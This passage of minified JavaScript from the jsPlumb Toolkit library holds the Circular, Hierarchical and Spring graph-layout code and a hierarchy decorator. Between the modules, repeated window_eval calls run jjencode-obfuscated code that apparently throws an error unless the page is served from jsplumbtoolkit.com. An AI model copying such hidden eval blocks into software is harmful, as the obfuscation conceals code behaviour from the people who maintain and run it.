._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Layouts, d = a.Farahey;
    c.Circular = function (a) {
        a = a || {};
        var b = c.AbstractLayout.apply(this, arguments), e = !!a.parameters && !0 === a.parameters.centerRootNode;
        a.group;
        this.defaultParameters = {padding: 30, locationFunction: a.locationFunction}, this.step = function (a, c) {
            var f = b.adapter.getElements();
            if (e && (f = f.slice(1)), 0 === f.length) return void b.setDone(!0);
            var g, h, i = 0, j = 0, k = 10, l = 2 * Math.PI / f.length, m = -Math.PI / 2;
            if (e) {
                var n = b.getSize(f[0].id);
                k = Math.max(n[0], n[1]) + 80
            }
            for (g = 0; g < f.length; g++) if (h = f[g], b.setPosition(h.id, i + Math.sin(m) * k, j + Math.cos(m) * k, !0), m += l, g > 0) {
                var o = f[g - 1], p = b.getSize(o.id), q = b.getPosition(o.id),
                    r = {x: q[0] - c.padding, y: q[1] - c.padding, w: p[0] + 2 * c.padding, h: p[1] + 2 * c.padding},
                    s = f[g], t = b.getSize(s.id), u = b.getPosition(s.id),
                    v = {x: u[0] - c.padding, y: u[1] - c.padding, w: t[0] + 2 * c.padding, h: t[1] + 2 * c.padding},
                    w = d.calculateSpacingAdjustment(r, v), x = [q[0] + p[0] / 2, q[1] + p[1] / 2],
                    y = [u[0] + w.left + t[0] / 2, u[1] + w.top + +t[1] / 2],
                    z = Math.sqrt(Math.pow(x[0] - y[0], 2) + Math.pow(x[1] - y[1], 2));
                k = Math.max(k, z / 2 / Math.sin(l / 2))
            }
            for (g = 0; g < f.length; g++) h = f[g], b.setPosition(h.id, i + Math.sin(m) * k, j + Math.cos(m) * k, !0), m += l;
            b.setDone(!0)
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Layouts, d = a.jsPlumbUtil;
    c.Hierarchical = function (a) {
        var b, e, f, g, h, i, j, k = c.AbstractHierarchicalLayout.apply(this, arguments), l = [],
            m = null != a.parameters && a.parameters.compress, n = null != a.parameters && !0 === a.parameters.invert,
            o = [], p = [], q = k.toolkit.getNodeId, r = function (a) {
                var b = o[a];
                return b || (b = {nodes: [], pointer: 0}, o[a] = b), b
            }, s = function (a, b, c, d, e) {
                var g = r(c), i = {
                    node: a,
                    parent: d,
                    childGroup: e,
                    loc: g.pointer,
                    index: g.nodes.length,
                    dimensions: b,
                    size: b[f]
                }, j = b[0 == f ? 1 : 0];
                return null == l[c] ? l[c] = j : l[c] = Math.max(l[c], j), g.pointer += b[f] + h[f], g.nodes.push(i), i
            }, t = function (a, b) {
                var c = p[b];
                c || (c = [], p[b] = c), a.index = c.length, c.push(a)
            }, u = function (a) {
                if (a.size > 0) {
                    var b = a.parent.loc + a.parent.size / 2 - (a.size - h[f]) / 2, c = p[a.depth], d = -1 / 0, e = 0;
                    if (null != c && c.length > 0) {
                        var g = c[c.length - 1], i = g.nodes[g.nodes.length - 1];
                        d = i.loc + i.size + h[f]
                    }
                    b >= d ? a.loc = b : (e = d - b, a.loc = d);
                    for (var j = a.loc, k = 0; k < a.nodes.length; k++) a.nodes[k].loc = j, j += a.nodes[k].size, j += h[f];
                    e > 0 && w(a), t(a, a.depth)
                }
            }, v = function (a) {
                var b = a.nodes[0].loc, c = a.nodes[a.nodes.length - 1].loc + a.nodes[a.nodes.length - 1].size,
                    d = (b + c) / 2, e = d - a.parent.size / 2, f = e - a.parent.loc;
                if (a.parent.loc = e, !a.parent.root) for (var g = a.parent.childGroup, h = a.parent.childGroupIndex + 1; h < g.nodes.length; h++) g.nodes[h].loc += f
            }, w = function (a) {
                for (var b = a; null != b;) v(b), b = b.parent.childGroup
            }, x = function (a, b) {
                return b.source === a || b.source.getNode && b.source.getNode() === a
            }, y = function (a, b) {
                if (!i[a.node.id]) {
                    i[a.node.id] = !0;
                    var c, d = j(a.node, k.toolkit), e = {nodes: [], loc: 0, size: 0, parent: a, depth: b + 1}, g = [],
                        l = {};
                    for (c = 0; c < d.length; c++) {
                        var m = x(a.node, d[c]) ? d[c].target : d[c].source;
                        if (m.getNode && (m = m.getNode()), null != (m = k.toolkit.getNode(m)) && m !== a.node && !l[m.id]) {
                            var n = k.getSize(q(m)), o = s(m, n, b + 1, a, e);
                            o.childGroupIndex = e.nodes.length, e.nodes.push(o), e.size += n[f] + h[f], g.push(o), l[m.id] = !0
                        }
                    }
                    for (u(e), c = 0; c < g.length; c++) y(g[c], b + 1)
                }
            };
        this.defaultParameters = {
            padding: [60, 60],
            orientation: "horizontal",
            border: 0,
            locationFunction: a.locationFunction
        };
        var z = this.begin;
        this.begin = function (a, c) {
            z.apply(this, arguments), b = c.orientation, e = "horizontal" === b, f = e ? 0 : 1, g = e ? "width" : "height", h = c.padding, o.length = 0, p.length = 0, i = {}, j = c.getChildEdges
        }, this.step = function (a, b) {
            for (var c, e, g, i = d.isArray(b.rootNode) ? b.rootNode : [b.rootNode], j = 0; j < i.length; j++) {
                c = i[j];
                var p = k.getSize(c.id), r = s(c, p, 0, null, null);
                r.root = !0, y(r, 0, null);
                var t, u, v = 0, w = function (a, b) {
                    var c = 0 === f ? 1 : 0;
                    return m && a.parent ? k.getPosition(q(a.parent.node))[c] + a.parent.dimensions[c] + h[c] : b
                };
                for (e = 0; e < o.length; e++) {
                    for (o[e].otherAxis = v, g = 0; g < o[e].nodes.length; g++) t = 0 == f ? o[e].nodes[g].loc : w(o[e].nodes[g], v), o[e].nodes[g].parent && k.getPosition(q(o[e].nodes[g].parent.node)), u = 1 == f ? o[e].nodes[g].loc : w(o[e].nodes[g], v), k.setPosition(q(o[e].nodes[g].node), t, u, !0);
                    n ? e < o.length - 1 && (o[e].otherAxisSize = l[e + 1] + h[0 == f ? 1 : 0], v -= o[e].otherAxisSize) : (o[e].otherAxisSize = l[e] + h[0 == f ? 1 : 0], v += o[e].otherAxisSize)
                }
            }
            k.setDone(!0)
        }, this.getHierarchy = function () {
            return o
        }, this.getOrientation = function () {
            return b
        };
        var A = this.nodeRemoved;
        this.nodeRemoved = function () {
            o = [], A.apply(this, arguments)
        }, this.getPadding = function () {
            return h
        }
    }, d.extend(c.Hierarchical, c.AbstractHierarchicalLayout)
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    this.jsPlumbToolkit.Layouts.Decorators.Hierarchy = function (a) {
        var b, c, d = [];
        this.reset = function (a) {
            for (var c = 0; c < d.length; c++) a.remove(d[c]);
            b && a.remove(b), d.length = 0
        }, this.decorate = function (a) {
            if (a.bounds[0] != 1 / 0) {
                var b = a.layout.getHierarchy();
                c = (a.layout.getPadding() || [60, 60])["horizontal" === d ? 0 : 1];
                for (var d = a.layout.getOrientation(), e = "horizontal" === d ? ["width", "height", a.bounds[2] - a.bounds[0]] : ["height", "width", a.bounds[3] - a.bounds[1]], f = 0; f < b.length; f++) {
                    var g = document.createElement("div");
                    a.append(g), g.className = "level " + (f % 2 ? "odd" : "even"), g.style[e[0]] = e[2] + 2 * c + "px", g.style[e[1]] = b[f].otherAxisSize + "px";
                    var h = "horizontal" === d ? [a.bounds[0] - c, b[f].otherAxis - c / 2] : [b[f].otherAxis - c / 2, a.bounds[1] - c];
                    a.setAbsolutePosition(g, h)
                }
            }
        }
    }
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Layouts, d = a.jsPlumbUtil;
    c.Spring = function (a) {
        this.defaultMagnetized = !0;
        var b = c.AbsoluteBackedLayout.apply(this, arguments);
        a.group;
        this.defaultParameters = {
            padding: [50, 50],
            iterations: 500,
            maxRepulsiveForceDistance: 6,
            k: 2,
            c: .01,
            maxVertexMovement: .5,
            locationFunction: a.locationFunction
        };
        var d, e = this.defaultParameters, f = {}, g = !1 !== a.absoluteBacked, h = 0, i = 1 / 0, j = -1 / 0, k = 1 / 0,
            l = -1 / 0, m = 1, n = 1, o = 0, p = function (a) {
                a.getNode && (a = a.getNode());
                var c = f[a.id];
                if (!c) {
                    var d = b.getRandomPosition(a.id, .5, .5, !0);
                    c = f[a.id] = {id: a.id, n: a, sp: d, p: [d[0], d[1]], f: [0, 0]}
                }
                return c
            }, q = function (a, b, c) {
                i = Math.min(i, b), k = Math.min(k, c), j = Math.max(j, b), l = Math.max(l, c), a.p[0] = b, a.p[1] = c
            }, r = function (a, b) {
                if (!a.locked || !b.locked) {
                    var c = b.p[0] - a.p[0], d = b.p[1] - a.p[1], f = c * c + d * d;
                    f < .01 && (c = .1 * Math.random() + .1, d = .1 * Math.random() + .1, f = c * c + d * d);
                    var g = Math.sqrt(f);
                    if (g < e.maxRepulsiveForceDistance) {
                        o++;
                        var h = e.k * e.k / g, i = h * c / g, j = h * d / g;
                        b.f[0] += b.locked ? 0 : (a.locked ? 2 : 1) * i, b.f[1] += b.locked ? 0 : (a.locked ? 2 : 1) * j, a.f[0] -= a.locked ? 0 : (b.locked ? 2 : 1) * i, a.f[1] -= a.locked ? 0 : (b.locked ? 2 : 1) * j
                    }
                }
            }, s = function (a, b) {
                var c = p(b.target);
                if (!a.locked || !c.locked) {
                    o++;
                    var d = c.p[0] - a.p[0], f = c.p[1] - a.p[1], g = d * d + f * f;
